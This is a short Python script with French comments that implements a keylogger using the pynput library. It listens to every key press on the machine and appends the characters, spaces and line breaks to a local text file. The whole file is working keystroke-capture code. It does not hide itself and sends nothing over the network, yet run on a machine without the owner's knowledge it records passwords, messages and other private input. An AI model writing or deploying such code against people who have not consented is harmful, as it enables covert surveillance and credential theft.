from pynput import keyboard


def onPush(key):
    """
    enregistre dans un fichier texte les touches frappes
    """

    try:
        with open("keylogger.txt", "a") as f:
            f.write(f"{key.char}")  # on gere les touches alphanumeriques
    except AttributeError as e:  # on decide de gerer les autres touches
        if key == keyboard.Key.space:
            with open("keylogger.txt", "a") as f:
                f.write(" ")  # on ecrit un espace
        elif key == keyboard.Key.enter:
            with open("keylogger.txt","a") as f:
                f.write("\n")   # on ecrit dans le fichier un saut à la ligne
        else:
            with open("keylogger.txt","a") as f:
                f.write(f"{key}")



if __name__ == "__main__":
    with keyboard.Listener(on_press=onPush) as listener:
        listener.join()
